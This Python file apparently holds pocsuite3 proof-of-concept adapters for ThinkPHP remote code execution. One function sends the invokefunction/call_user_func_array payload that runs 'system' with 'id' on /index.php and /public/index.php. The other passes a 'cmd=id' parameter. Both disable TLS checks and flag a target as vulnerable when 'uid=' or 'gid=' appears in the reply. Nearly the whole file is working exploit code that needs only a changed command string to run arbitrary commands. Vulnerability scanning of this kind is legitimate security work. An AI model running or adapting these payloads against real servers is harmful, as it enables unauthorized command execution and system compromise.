def poc_99617_ai_poc(url, timeout=10):
    """
    ThinkPHP SSVID-99617 POC 适配器
    """
    try:
        from pocsuite3.api import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        url = url.rstrip('/')
        
        paths = ['/index.php', '/public/index.php']
        
        for path in paths:
            try:
                payload = f"{path}/s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
                verify_url = url + payload
                
                resp = requests.get(verify_url, timeout=timeout, verify=False)
                
                if "uid=" in resp.text.lower() or "gid=" in resp.text.lower():
                    return True, f"Vulnerable: {verify_url}"
            except:
                continue
        
        return False, "Not Vulnerable"
    except Exception as e:
        return False, str(e)

def poc_manual_thinkphp_ai_poc(url, timeout=10):
    """
    ThinkPHP RCE via cmd parameter POC 适配器
    """
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        path = '/index.php'
        target_url = url.rstrip('/') + path
        payload = {'cmd': 'id'}
        
        r = requests.get(target_url, params=payload, timeout=timeout, verify=False, allow_redirects=False)
        
        if r.status_code == 200 and ('uid=' in r.text or 'gid=' in r.text or 'whoami' in r.text):
            return True, f"Vulnerable: {target_url}"
        
        return False, "Not Vulnerable"
    except Exception as e:
        return False, str(e)

__all__ = [
    'poc_99617_ai_poc',
    'poc_manual_thinkphp_ai_poc'
]
